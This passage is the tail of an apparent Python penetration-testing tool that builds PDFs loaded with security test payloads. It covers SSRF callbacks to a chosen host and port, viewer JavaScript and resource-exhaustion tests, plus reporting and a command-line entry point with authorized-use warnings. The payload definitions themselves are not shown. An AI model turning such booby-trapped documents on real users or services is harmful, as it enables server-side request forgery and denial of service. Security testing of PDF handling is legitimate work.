            # Add resource exhaustion tests last to avoid interfering with other tests
            test_methods.append(self.add_resource_exhaustion_tests)
            
            for method in test_methods:
                try:
                    method(writer)
                    successful_payloads += 1
                except Exception as e:
                    self.logger.error(f"Error in {method.__name__}: {str(e)}")
                    failed_payloads += 1
            
            # Save the final PDF
            with open(output_path, 'wb') as output_file:
                writer.write(output_file)
            
            # Generate test report
            self._generate_report(output_path, {
                'successful_payloads': successful_payloads,
                'failed_payloads': failed_payloads,
                'total_payloads': len(self.execution_log)
            })
            
        except Exception as e:
            self.logger.error(f"Critical error creating security test PDF: {str(e)}")
            raise

    def _generate_report(self, pdf_path: str, stats: Dict[str, int]) -> None:
        """Generate a detailed report of included payloads"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'pdf_path': pdf_path,
            'test_id': self.test_id,
            'callback_url': self.callback_url,
            'statistics': stats,
            'configuration': self.config,
            'execution_log': self.execution_log,
            'payloads': [
                {
                    'name': p.name,
                    'category': p.category.value,
                    'description': p.description,
                    'viewer_requirements': p.viewer_requirements,
                    'expected_outcome': p.expected_outcome,
                    'severity': p.severity,
                    'mitigation': p.mitigation,
                    'tags': p.tags,
                    'references': p.references
                }
                for p in self.inserted_payloads
            ]
        }
        
        report_path = f"{pdf_path}.report.json"
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Test report generated: {report_path}")
        
        # Print summary to console
        print("\nTest Execution Summary:")
        print(f"Total Payloads: {stats['total_payloads']}")
        print(f"Successful: {stats['successful_payloads']}")
        print(f"Failed: {stats['failed_payloads']}")
        print(f"\nDetailed report saved to: {report_path}")

def main():
    parser = argparse.ArgumentParser(
        description='PDF Security Test Generator - FOR AUTHORIZED TESTING ONLY',
        epilog='WARNING: Use only in controlled environments with proper authorization.'
    )
    parser.add_argument('--callback-host', required=True, help='Callback host for SSRF tests')
    parser.add_argument('--callback-port', required=True, help='Callback port')
    parser.add_argument('--output', default='security_test.pdf', help='Output PDF path')
    parser.add_argument('--config', help='Path to configuration JSON file')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Set up logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    logger = logging.getLogger('PDFSecurityTester')
    
    # Display warning
    logger.warning("""
    ⚠️  WARNING: This tool generates PDFs containing security test payloads.
    Only use in authorized, controlled environments for security testing.
    Never use against production systems without explicit permission.
    """)
    
    callback_url = f"http://{args.callback_host}:{args.callback_port}"
    
    # Load configuration if provided
    config = None
    if args.config:
        try:
            with open(args.config) as f:
                config = json.load(f)
        except Exception as e:
            logger.error(f"Error loading configuration file: {str(e)}")
            return
    
    try:
        tester = PDFSecurityTester(callback_url, config)
        tester.create_security_test_pdf(args.output)
        
        print("\nPDF Security Test Suite - Complete")
        print(f"\nGenerated files:")
        print(f"1. Test PDF: {args.output}")
        print(f"2. Test Report: {args.output}.report.json")
        
        print("\nNext Steps:")
        print("1. Review the test report for payload details")
        print("2. Upload the PDF to your testing environment")
        print("3. Monitor the callback URL for active payloads")
        print("4. Test with different PDF viewers:")
        print("   - Adobe Acrobat DC (JavaScript execution)")
        print("   - PDF.js (Content rendering)")
        print("   - Chrome PDF Viewer (Basic rendering)")
        print("5. Review processing logs for errors")
        
    except Exception as e:
        logger.error(f"Error running security tests: {str(e)}")
        raise

if __name__ == "__main__":
    main()
